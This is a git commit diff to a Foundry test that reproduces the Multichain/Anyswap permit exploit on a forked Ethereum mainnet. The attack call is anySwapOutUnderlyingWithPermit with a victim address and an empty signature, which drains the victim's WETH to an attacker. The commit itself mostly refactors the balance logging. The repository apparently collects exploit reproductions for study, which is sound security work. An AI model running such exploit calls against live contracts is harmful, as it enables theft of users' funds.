15f170c02550a5c0c81667a9bfc2cd828a871581
Nine December <108370058+nine-december@users.noreply.github.com>
2022-11-17 11:19:57 -0300

    Update Multichain_Permit.attack.sol

--- test/Bad_Data_Validation/Multichain_Permit.attack.sol
+++ test/Bad_Data_Validation/Multichain_Permit.attack.sol
@@ -5,6 +5,8 @@ import "forge-std/Test.sol";
 import {TestHarness} from "../TestHarness.sol";
 import {IWETH9} from "../interfaces/IWETH9.sol";
 
+import {TokenBalanceTracker} from '../modules/TokenBalanceTracker.sol';
+
 // forge test --match-contract Exploit_Multichain -vvv
 
 /*
@@ -101,11 +103,11 @@ interface AnyswapV1ERC20 {
 }
 
 // forge test --match-contract Exploit_Multichain -vvv
-contract Exploit_Multichain is TestHarness{
+contract Exploit_Multichain is TestHarness, TokenBalanceTracker{
     address WETH_Address = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
     AnyswapV4Router swapRouter  = AnyswapV4Router(0x6b7a87899490EcE95443e979cA9485CBE7E71522);
     AnyswapV1ERC20 swap20 =AnyswapV1ERC20(0x6b7a87899490EcE95443e979cA9485CBE7E71522);
-    IWETH9  weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+    IWETH9 internal weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
 
     address constant internal ATTACKER = 0xFA2731d0BEde684993AB1109DB7ecf5bF33E8051;
     address constant internal VICTIM = 0x3Ee505bA316879d246a8fD2b3d7eE63b51B44FAB;
@@ -115,35 +117,42 @@ contract Exploit_Multichain is TestHarness{
     function setUp() external {
         cheat.createSelectFork("mainnet", 14037236); // We pin one block before the exploit happened.
 
+        cheat.deal(address(this), 0);
+
         cheat.label(ATTACKER, "Attacker");
         cheat.label(VICTIM, "Victim");
         cheat.label(address(swapRouter), "AnyswapV4Router");
         cheat.label(address(swap20), "AnyswapV1ERC20");
         cheat.label(address(weth), "WETH");
+
+        addTokenToTracker(address(weth));
+        updateBalanceTracker(address(this));
+        updateBalanceTracker(VICTIM);
+        updateBalanceTracker(ATTACKER);
     }
 
     function test_attack() external {
         cheat.startPrank(ATTACKER);
-        console.log("\nBefore Attack WETH Balance");
-        console.log("Victim: ",weth.balanceOf(VICTIM));
-        console.log("Attacker Contract: ",weth.balanceOf(address(this)));
-        console.log("Attacker EOA: ",weth.balanceOf(ATTACKER));
+        console.log("\nBefore Attack Balances");
+        logBalancesWithLabel('Attacker Contract', address(this));
+        logBalancesWithLabel('Attacker EOA', ATTACKER);
+        logBalancesWithLabel('Victim', VICTIM);
 
         //swapRouter.anySwapOutUnderlyingWithPermit(from, token, to, amount, deadline, v, r, s, toChainID);
         swapRouter.anySwapOutUnderlyingWithPermit(VICTIM, address(this), ATTACKER, stole_WETH, FUTURE_DEADLINE, 0, bytes32(0), bytes32(0), 56); // To BSC.
-        console.log("\nDuring Attack WETH Balance");
-        console.log("Victim: ",weth.balanceOf(VICTIM));
-        console.log("Attacker Contract: ",weth.balanceOf(address(this)));
-        console.log("Attacker EOA: ",weth.balanceOf(ATTACKER));
+        console.log("\nDuring Attack Balances");
+        logBalancesWithLabel('Attacker Contract', address(this));
+        logBalancesWithLabel('Attacker EOA', ATTACKER);
+        logBalancesWithLabel('Victim', VICTIM);
         cheat.stopPrank();
         
         // Send WETH from this contract to the attacker.
         weth.transfer(ATTACKER, weth.balanceOf(address(this)));
 
-        console.log("\nAfter Attack WETH Balance");
-        console.log("Victim: ",weth.balanceOf(VICTIM));
-        console.log("Attacker Contract: ",weth.balanceOf(address(this)));
-        console.log("Attacker EOA: ",weth.balanceOf(ATTACKER));
+        console.log("\nAfter Attack Balances");
+        logBalancesWithLabel('Attacker Contract', address(this));
+        logBalancesWithLabel('Attacker EOA', ATTACKER);
+        logBalancesWithLabel('Victim', VICTIM);
     }
 
     // Used to get the underlying of the token
